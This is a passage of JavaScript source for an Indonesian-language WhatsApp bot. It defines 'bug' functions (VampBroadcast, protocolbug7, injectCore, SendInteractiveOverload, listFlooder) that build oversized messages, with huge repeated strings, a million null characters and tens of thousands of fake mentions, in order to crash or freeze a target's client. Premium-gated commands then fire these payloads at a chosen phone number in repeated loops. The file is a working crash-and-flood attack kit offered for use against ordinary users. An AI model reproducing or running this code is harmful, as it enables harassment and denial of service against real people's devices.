          { name: "single_select", buttonParamsJson: JSON.stringify({ title: "Option 1", sections: [] }) },
          { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Reply 1", id: "reply1" }) }
        ]
      }
    },
    {
      header: {
        title: "Card 2 Title",
        subtitle: "Card 2 Subtitle",
        hasMediaAttachment: false
      },
      body: {
        text: "Ini card kedua dengan tombol"
      },
      footer: {
        text: "Footer 2"
      },
      nativeFlowMessage: {
        buttons: [
          { name: "call_permission_request", buttonParamsJson: "{}" },
          { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "Visit Site", url: "https://example.com" }) }
        ]
      }
    }
  ];

  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: messagePayload,
          body: { text: "Gabungan dokumen dan carousel" },
          carouselMessage: {
            cards: cards,
            messageVersion: 1
          },
          nativeFlowMessage: {
            buttons: buttonsDoc
          }
        }
      }
    }
  };

  await Usztzy.relayMessage(
    target,
    message,
    { participant: { jid: target } },
    { messageId: null }
  );

  console.log("Pesan gabungan berhasil dikirim");
}
// fc spam
async function VampBroadcast(Usztzy, target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Sasuke Crash 🐍 🐍 Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await Usztzy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await Usztzy.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "usztreamaker ☠️ Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}


async function protocolbug7(isTarget, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await Usztzy.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await Usztzy.relayMessage(isTarget, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

// delay X nyedot-kouta
async function injectCore(target) {
const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "KiyahIohCrott⚔️" + "ោ៝".repeat(10000),
        title: "Hentai",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0=",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7QHak+aKshao_628Jak=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Usztzy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function SendInteractiveOverload(target, ptcp = true) {
  await Usztzy.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Well, Looks",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\u0000".repeat(1000000),
              version: 2,
            },
          },
        },
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function listFlooder(target, quotedMsg) {
  const msg = generateWAMessageFromContent(target, {
    listMessage: {
      title: "List Bomb " + "🌀".repeat(2000),
      description: "Test Gacor List",
      buttonText: "CLICK HERE",
      footerText: "footer " + "⚠️".repeat(1000),
      listType: 1,
      sections: Array.from({ length: 5 }, (_, i) => ({
        title: "Section " + (i + 1),
        rows: Array.from({ length: 20 }, (_, j) => ({
          title: `Item #${j + 1}`,
          rowId: `row_${j}_${i}`,
          description: "🧨".repeat(100)
        }))
      })),
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        mentionedJid: ["0@s.whatsapp.net"]
      }
    }
  }, { userJid: target });

  await Usztzy.relayMessage(target, msg.message, quotedMsg ? { messageId: msg.key.id } : {});
}
//======================
switch (command) {
//case bug
case "usz-delay": {

if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');

if (!text) return m.reply(`\`Example:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);

target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝚄𝙹𝚄𝙰𝙽 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 

          for (let i = 0; i < 35; i++) {

            await protocolbug3(target);

            await sleep(1500);

            await protocolbug3(target);

            await protocolbug3(target);

            await sleep(2000);

            await protocolbug3(target);

            await protocolbug3(target);

            await sleep(1500);

            await protocolbug3(target);

}

    }

  

break;
//======================
case "usz-invslow": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙰𝙽𝙶 𝚄𝚂𝚉');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await trashprotocol(target);
            await trashprotocol(target);
            await trashprotocol(target);
            await trashprotocol(target);
            await trashprotocol(target);
            await trashprotocol(target);
            await trashprotocol(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await arka1(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug5(target);
            await protocolbug3(target);
            await protocolbug3(target);
            await protocolbug3(target);
            await protocolbug3(target);
            await protocolbug3(target);
            await protocolbug3(target);
            await protocolbug3(target);
            await protocolbug3(target);
            await protocolbug3(target);
            await protocolbug3(target);
            await arka2(target);
            await arka2(target);
            await arka2(target);
            await arka2(target);
            await arka2(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka2(target);
            await arka2(target);
            await arka2(target);
            await arka2(target);
            await arka2(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await arka3(target);
            await sleep(3000);
}
    }

break;
//======================
case "uszcrausel": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await FloodsCarousel2(target);
            await sleep(1500);
            await FloodsCarousel2(target);
            await FloodsCarousel2(target);
            await sleep(2000);
            await FloodsCarousel2(target);
            await FloodsCarousel2(target);
            await sleep(1500);
            await FloodsCarousel2(target);
            await FloodsCarousel2(target);
            await sleep(1500);
            await FloodsCarousel2(target);
            await FloodsCarousel2(target);
            await sleep(2000);
}
    }

break;
//======================
case "usz-bulldozer": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await bulldozer(target);
            await sleep(1500);
            await bulldozer(target);
           
}
    }

break;
//======================
case "await-usz": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await spack2(target);
            await sleep(1500);
            await spack2(target);
            await spack2(target);
            await sleep(2000);
            await spack2(target);
            await spack2(target);
            await sleep(1500);
            await spack2(target);
}
    }

break;
//======================
case "usz-hard": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} [𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯] 𝙱𝙰𝙽𝙶 𝙺𝙾𝙺 𝚂𝙴𝚃𝙴𝙻𝙰𝙷 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙶𝙰 𝙲𝟷🤓, 𝚈𝙰 𝙻𝚄 𝙼𝙸𝙺𝙸𝚁 𝙰𝙹𝙰 𝙽𝙶𝙴𝙽𝚃𝙾𝙳 𝙱𝙰𝚁𝚄 𝙰𝙹𝙰 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙻𝙸𝙰𝚃 𝚃𝙰𝚁 𝙺𝙰𝙻𝙾 𝚄𝙳𝙷 𝚃𝙴𝚁𝙺𝙸𝚁𝙸𝙼 𝚂𝙴𝙼𝚄𝙰𝙽𝚈𝙰 𝚃𝚄𝙽𝙶𝙶𝚄𝙸𝙽 𝙰𝙹𝙰 𝟸 𝙼𝙴𝙽𝙸𝚃! *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await trashprotocol(target);
            await sleep(1500);
            await trashprotocol(target);
            await trashprotocol(target);
            await sleep(2000);
            await trashprotocol(target);
            await trashprotocol(target);
            await sleep(1500);
            await trashprotocol(target);
}
    }

break;
//======================
case "usz-delaystc": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 628xxxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await DelayStc(target);
            await sleep(1500);
            await DelayStc(target);
            await DelayStc(target);
            await sleep(2000);
            await DelayStc(target);
            await DelayStc(target);
            await sleep(1500);
            await DelayStc(target);
            await DelayStc(target);
            await sleep(2000);
            await DelayStc(target);
}
    }

break;
//======================
case "usz-inviskntk": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await invisKontak(target);
            await sleep(1500);
            await invisKontak(target);
            await invisKontak(target);
            await sleep(2000);
            await invisKontak(target);
            await invisKontak(target);
            await sleep(1500);
            await invisKontak(target);
}
    }


break;
//======================
case "usz-delay2": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await VampBroadcast(target);
            await sleep(1500);
            await VampBroadcast(target);
            await VampBroadcast(target);
            await sleep(2000);
            await VampBroadcast(target);
            await VampBroadcast(target);
            await sleep(1500);
            await invisKontak(target);
            await invisKontak(target);
            await sleep(1500);
            await invisKontak(target);
            await invisKontak(target);
            await sleep(2000);
}
    }

break;
//======================
case ".": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
